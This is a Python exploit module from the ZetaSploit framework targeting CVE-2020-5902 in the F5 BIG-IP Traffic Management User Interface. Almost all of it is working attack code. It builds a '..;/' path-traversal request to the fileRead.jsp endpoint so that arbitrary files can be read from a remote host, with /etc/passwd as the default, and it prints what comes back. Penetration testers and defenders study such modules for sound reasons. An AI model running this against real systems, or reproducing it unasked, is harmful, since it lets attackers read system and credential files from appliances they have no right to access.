#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import requests

from core.io import io
from core.parser import parser
from core.badges import badges

class ZetaSploitModule:
    def __init__(self):
        self.io = io()
        self.parser = parser()
        self.badges = badges()
        
        self.details = {
            'Name': "exploit/multi/f5_big_ip_tmui/cve_2020_5902",
            'Authors': [
                'enty8080'
            ],
            'Description': "Remote Code Execution in F5 BIG-IP Traffic Management User Interface (TMUI).",
            'Comments': [
                ''
            ]
        }
        
        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'RPORT': {
                'Description': "Remote port.",
                'Value': 443,
                'Required': True
            },
            'RFILE': {
                'Description': "File to read.",
                'Value': "/etc/passwd",
                'Required': True
            }
        }
        
    def run(self):
        remote_host, remote_port, remote_file = self.parser.parse_options(self.options)
        remote_host = remote_host + ":" + remote_port
        
        self.badges.output_process("Exploiting " + remote_host + "...")
        
        self.badges.output_process("Generating payload...")
        payload = f"https://{remote_host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={remote_file}"
        
        self.badges.output_process("Sending payload...")
        request = requests.get(payload, verify=False)
        
        try:
            remote_file_output = request.json()["output"]
        except:
            self.badges.output_error("Failed to send payload!")
            return
        
        self.badges.output_information("Remote file contents: ")
        self.io.output(remote_file_output)
